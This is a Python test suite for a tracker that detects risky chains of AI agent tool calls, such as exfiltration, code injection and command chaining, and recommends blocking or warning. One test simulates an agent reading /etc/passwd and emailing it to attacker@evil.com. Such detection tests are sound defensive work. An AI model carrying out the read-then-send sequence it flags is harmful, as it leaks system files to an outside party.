from __future__ import annotations

import time

from orchesis.risk.compositional import (
    CompositionalRiskTracker,
    ToolCall,
    check_compositional_risk,
)


def test_exfil_chain() -> None:
    tracker = CompositionalRiskTracker()
    tracker.record_tool_call("read_file", {"path": "/etc/passwd"})
    tracker.record_tool_call("send_email", {"to": "attacker@evil.com"})

    risk = tracker.check_compositional_risk()

    assert risk.detected_chains
    assert risk.detected_chains[0]["category"] == "data_exfiltration"


def test_code_injection_chain() -> None:
    tracker = CompositionalRiskTracker()
    tracker.record_tool_call("read_file")
    tracker.record_tool_call("write_file")
    tracker.record_tool_call("execute")

    risk = tracker.check_compositional_risk()

    assert any(item["chain_id"] == "DC-002" for item in risk.detected_chains)


def test_command_chaining() -> None:
    tracker = CompositionalRiskTracker()
    tracker.record_tool_call("execute")
    tracker.record_tool_call("execute")

    risk = tracker.check_compositional_risk()

    assert any(item["chain_id"] == "DC-004" for item in risk.detected_chains)


def test_no_chain_safe_sequence() -> None:
    tracker = CompositionalRiskTracker()
    tracker.record_tool_call("search")
    tracker.record_tool_call("search")

    risk = tracker.check_compositional_risk()

    assert risk.detected_chains == []


def test_partial_match_not_detected() -> None:
    tracker = CompositionalRiskTracker()
    tracker.record_tool_call("read_file")

    risk = tracker.check_compositional_risk()

    assert risk.detected_chains == []


def test_multiple_chains() -> None:
    tracker = CompositionalRiskTracker()
    tracker.record_tool_call("read_file")
    tracker.record_tool_call("send_email")
    tracker.record_tool_call("execute")
    tracker.record_tool_call("execute")

    risk = tracker.check_compositional_risk()

    chain_ids = {item["chain_id"] for item in risk.detected_chains}
    assert "DC-001" in chain_ids
    assert "DC-004" in chain_ids


def test_high_score() -> None:
    tracker = CompositionalRiskTracker()
    tracker.record_tool_call("read_file")
    tracker.record_tool_call("send_email")

    risk = tracker.check_compositional_risk()

    assert risk.score >= 0.8


def test_medium_score() -> None:
    tracker = CompositionalRiskTracker(score_threshold=0.8)
    tracker.record_tool_call("execute")
    tracker.record_tool_call("execute")

    risk = tracker.check_compositional_risk()

    assert 0.5 < risk.score < 0.8


def test_zero_score_empty() -> None:
    risk = CompositionalRiskTracker().check_compositional_risk()
    assert risk.score == 0.0


def test_record_tool_call() -> None:
    tracker = CompositionalRiskTracker()
    tracker.record_tool_call("search", {"query": "x"}, agent_id="agent-1")

    history = tracker.get_history()

    assert len(history) == 1
    assert history[0].tool_name == "search"
    assert history[0].agent_id == "agent-1"


def test_window_trim() -> None:
    tracker = CompositionalRiskTracker(window_seconds=10.0)
    now = time.time()
    tracker._history = [  # noqa: SLF001
        ToolCall(tool_name="read_file", timestamp=now - 20),
        ToolCall(tool_name="send_email", timestamp=now - 1),
    ]

    risk = tracker.check_compositional_risk()

    assert risk.tool_count == 1
    assert tracker.get_history()[0].tool_name == "send_email"


def test_clear_history() -> None:
    tracker = CompositionalRiskTracker()
    tracker.record_tool_call("search")
    tracker.clear()
    assert tracker.get_history() == []


def test_check_compositional_risk_function() -> None:
    risk = check_compositional_risk(
        [
            {"tool": "read_file", "args": {"path": "x"}},
            {"tool": "send_email", "args": {"to": "y"}},
        ]
    )

    assert risk.score > 0.0
    assert any(item["chain_id"] == "DC-001" for item in risk.detected_chains)


def test_standalone_with_timestamps() -> None:
    now = time.time()
    risk = check_compositional_risk(
        [
            {"tool": "read_file", "timestamp": now - 1000},
            {"tool": "send_email", "timestamp": now - 1},
        ],
        window_seconds=60.0,
    )

    assert risk.tool_count == 1
    assert risk.detected_chains == []


def test_block_recommendation() -> None:
    tracker = CompositionalRiskTracker(score_threshold=0.7)
    tracker.record_tool_call("read_file")
    tracker.record_tool_call("send_email")

    risk = tracker.check_compositional_risk()

    assert "BLOCK" in risk.recommendation


def test_warn_recommendation() -> None:
    tracker = CompositionalRiskTracker(score_threshold=0.95)
    tracker.record_tool_call("read_file")
    tracker.record_tool_call("send_email")

    risk = tracker.check_compositional_risk()

    assert "WARN" in risk.recommendation
